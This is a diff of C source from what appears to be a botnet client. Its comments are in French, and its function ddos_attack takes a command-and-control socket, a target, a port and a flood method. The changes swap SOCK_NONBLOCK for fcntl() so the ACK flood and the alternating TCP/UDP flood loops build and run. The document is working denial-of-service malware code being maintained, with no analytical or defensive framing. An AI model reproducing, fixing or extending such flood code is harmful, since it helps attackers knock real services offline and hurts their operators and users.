@@ -8,10 +8,7 @@
 #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
 #define MIN_PACKET_SIZE (1024)             // 1KB min
 
-/* Définition pour éviter l'erreur asm/socket.h */
-#ifndef SOCK_NONBLOCK
-#define SOCK_NONBLOCK 04000
-#endif
+/* Utilisation de fcntl() pour les sockets non-bloquants au lieu de SOCK_NONBLOCK */
 
 /* Headers système */
 #include <stdio.h>
@@ -348,8 +345,11 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     else if (strcmp(method, "ack") == 0) {
         // ACK flood
         while (time(NULL) - start_time < duration) {
-            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+            sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock != -1) {
+                // Rendre le socket non-bloquant
+                int flags = fcntl(sock, F_GETFL, 0);
+                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                 connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                 send(sock, attack_packet, 64, 0); // Juste 64 octets
                 close(sock);
@@ -367,8 +367,14 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
                 // Alterner entre TCP et UDP
                 int proto = (t + (int)time(NULL)) % 2;
                 sock = socket(AF_INET, 
-                            proto ? SOCK_STREAM | SOCK_NONBLOCK : SOCK_DGRAM,
+                            proto ? SOCK_STREAM : SOCK_DGRAM,
                             proto ? 0 : IPPROTO_UDP);
+                
+                // Rendre le socket non-bloquant avec fcntl si c'est TCP
+                if (proto && sock != -1) {
+                    int flags = fcntl(sock, F_GETFL, 0);
+                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+                }
                 
                 if (sock != -1) {
                     if (proto) { // TCP
